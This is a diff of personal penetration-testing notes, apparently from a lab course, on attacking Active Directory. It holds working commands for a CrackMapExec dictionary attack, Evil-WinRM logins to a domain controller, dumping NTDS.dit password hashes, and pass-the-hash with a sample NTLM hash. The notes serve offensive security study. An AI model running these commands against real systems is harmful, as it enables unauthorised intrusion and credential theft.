@@ -1,13 +1,11 @@
 #windows/auth/AD/NTDS
-
 # Dictionary Attacks against AD accounts using #CrackMapExec
 ```bash
 crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
  ```
-
 # Capturing NTDS.dit
 NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. Recall that NTDS.dit file is stored at %systemroot%/ntds on the domain controllers in a forest. The .dit stands for directory information tree. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information.
-### Connecting to a DC with Evil-WinRM
+### Connecting to a DC with #evil-winrm 
 ```bash
 evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
 ```
@@ -43,7 +41,7 @@ Successfully created shadow copy for 'C:\'
 ```bash
 crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
 ```
-# Pass-the-Hash with Evil-WinRM Example
+# [[Pass the Hash]] with #evil-winrm  Example
 If cracking NTDS hash no successfull, we can use hash directly:
 ```bash
 evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
